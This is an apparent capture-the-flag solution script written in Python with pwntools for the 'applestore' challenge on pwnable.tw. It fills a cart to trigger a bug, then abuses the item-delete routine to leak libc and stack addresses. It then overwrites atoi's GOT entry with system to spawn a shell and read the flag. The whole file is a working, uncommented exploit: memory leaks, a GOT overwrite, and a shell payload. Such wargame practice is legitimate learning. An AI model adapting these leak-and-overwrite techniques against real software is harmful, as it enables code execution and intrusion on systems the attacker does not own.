#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x08048A03
            b* 0x08048A0C
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10104)

def add(num):
    p.sendafter(b'> ', str(2))
    p.sendafter(b'Device Number> ', str(num))

def delete(data):
    p.sendafter(b'> ', str(3))
    p.sendafter(b'Item Number> ', data)

for x1 in range(20):
    for x2 in range(20):
        for x3 in range(20):
            for x4 in range(20):
                for x5 in range(20):
                    total = 199*x1 + 299*x2 + 499*x3 + 399*x4 + 199*x5
                    if total == 7174:
                        # print(f"x1={x1}, x2={x2}, x3={x3}, x4={x4}, x5={x5} => total={total}")
                        break

for i in range(19):
    add(1)

for i in range(6):
    add(3)

for i in range(1):
    add(4)

# Leak libc
p.sendafter(b'> ', str(5))
p.sendafter(b'(y/n) > ', b'y')
payload = b'27' + p32(exe.got.puts)
delete(payload)

p.recvuntil(b'Remove 27:')
libc_leak = u32(p.recv(4))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
print("Libc base: " + hex(libc.address))

# Leak stack
payload = b'27' + p32(libc.sym.environ)
delete(payload)

p.recvuntil(b'Remove 27:')
stack_leak = u32(p.recv(4))
print("Stack leak: " + hex(stack_leak))
saved_ebp = stack_leak - 0x104
print("Ebp: " + hex(saved_ebp))

payload = b'27'
payload += flat(
    0,
    0,
    exe.got.atoi + 0x22,
    saved_ebp - 8
    )
# GDB()
delete(payload)

payload = flat(
    libc.sym.system,
    b';sh'
    )
p.sendafter(b'> ', payload)
p.sendline(b'cat /home/applestore/flag')

p.interactive()